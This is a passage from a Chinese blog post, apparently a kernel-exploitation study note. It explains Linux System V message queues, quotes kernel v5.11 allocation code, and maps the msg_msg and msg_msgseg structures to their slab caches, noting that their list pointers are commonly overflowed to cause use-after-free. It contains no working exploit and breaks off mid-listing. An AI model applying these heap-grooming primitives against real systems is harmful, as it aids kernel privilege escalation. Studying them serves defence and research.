<p>此外还有更多的<code>msg_flag</code>，就不一一举例了。</p>

        <h4 id="③释放"   >
          <a href="#③释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#③释放" class="headerlink" title="③释放"></a>③释放</h4>
      <p>这个主要是用到<code>msgctl</code>封装函数或者<code>__NR_msgctl</code>系统调用，直接释放掉所有的消息结构，包括申请的<code>msg_queue</code>的结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id,IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过一般也用不到，可能某些合并obj的情况能用到?</p>
<p>此外还有更多的<code>cmd</code>命令，常用来设置内核空间的<code>msg_queue</code>结构上的相关数据，不过多介绍了。</p>

        <h4 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h4>
      <p>总结一下大致的使用方法如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-内存分配与释放"   >
          <a href="#2-内存分配与释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①创建-1"   >
          <a href="#①创建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-1" class="headerlink" title="①创建"></a>①创建</h4>
      
        <h5 id="A-内存申请"   >
          <a href="#A-内存申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <ul>
<li><p>还是需要先创建<code>msg_queue</code>结构体，使用<code>msgget</code>函数，调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注最后的<code>newque()</code>函数，在该函数中使用<code>kvmalloc()</code>申请堆块，大小为0x100，属于<code>kmalloc-256</code>，(不同版本大小貌似不同)。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个才是实际申请的堆块内存</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//进行相关注册</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下面一堆看不懂在干啥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>创建的结构体如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//这些为一些相关信息</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放msg_msg相关指针next、prev,比较重要,通常拿来溢出制造UAF</span></span><br><span class="line">    <span class="comment">//和该消息队列里的所有消息组成双向循环链表</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>接着当使用<code>msgsnd</code>函数传递消息时，会创建新的<code>msg_msg</code>结构体，消息过长的话就会创建更多的<code>msg_msgseg</code>来存储更多的消息。相关的函数调用链如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注在<code>alloc_msg()</code>函数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最大发送DATALEN_MSG长度的消息</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//这里的PAGE_SIZE为0x400,即最多kmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//使用正常</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果传入消息长度超过0x400-0x30,就再进行申请msg_msgseg。</span></span><br><span class="line">    <span class="comment">//使用kmalloc申请,标志为GFP_KERNEL_ACCOUNT。</span></span><br><span class="line">    <span class="comment">//最大也为0x400,也属于kmalloc-1024</span></span><br><span class="line">    <span class="comment">//还有再长的消息,就再申请msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//不知道干啥的</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//申请完之后,将msg_msgseg放到msg-&gt;next这个单向链表上</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>结构体如下，头部大小<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//与msg_queue或者其他的msg_msg组成双向循环链表</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//单向链表，指向该条信息后面的msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>结构如下，只是一个<code>struct msg_msgseg*</code>指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="相关内存结构："   >
          <a href="#相关内存结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关内存结构：" class="headerlink" title="相关内存结构："></a>相关内存结构：</h6>
      <p>在一个<code>msg_queue</code>队列下，消息长度为<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>一条消息：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>两条消息：</p>
<p>以<code>msg_queue</code>的<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件"></p>
</li>
</ul>
<p>同理，同一个<code>msg_queue</code>消息队列下的多条消息也是类似的</p>

        <h6 id="内存申请总结："   >
          <a href="#内存申请总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li>使用<code>msgget()</code>函数创建内核空间的消息队列结构<code>msg_msgseg</code>，返回值为消息队列的<code>id</code>标志<code>queue_id</code><ul>
<li><code>msg_msgseg</code>管理整个消息队列，大小为0x100，<code>kmalloc-256</code>。</li>
<li>其<code>struct list_head q_messages;</code>域为链表头，和<code>msg_msg</code>结构的<code>struct list_head m_list</code>域串联所有的<code>msg_msg</code>形成双向循环链表</li>
</ul>
</li>
<li>每次在该消息队列<code>queue_id</code>下调用<code>msgsnd()</code>函数都会申请内核空间的<code>msg_msg</code>结构，消息长度大于<code>0x400-0x30</code>就会申请内核空间的<code>msg_msgseg</code>结构<ul>
<li><code>msg_msg</code>为每条消息存放消息数据的结构，与<code>msg_queue</code>形成双向循环链表，与<code>msg_msgseg</code>形成单向链表大小最大为0x400，属于<code>kmalloc-64</code>至<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>也为每条消息存放消息数据的结构，挂在<code>msg_msg</code>单向链表中，大小最大为<code>0x400</code>，属于<code>kmalloc-16</code>至<code>kmalloc-1024</code>，当消息长度很长时就会申请很多的内核空间的<code>msg_msgseg</code>结构。</li>
</ul>
</li>
</ul>

        <h5 id="B-数据复制"   >
          <a href="#B-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>调用完<code>alloc_msg()</code>函数后，回到<code>load_msg()</code>函数接着进行数据复制，函数还是挺简单的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先复制进msg_msg中存放消息的部分</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历msg_msg下的msg_msgseg,逐个存放数据进去</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放"   >
          <a href="#②释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放" class="headerlink" title="②释放"></a>②释放</h4>
      <p>相关的函数调用链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>首先关注一下<code>do_msgrcv()</code>函数，里面很多东西都比较重要</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 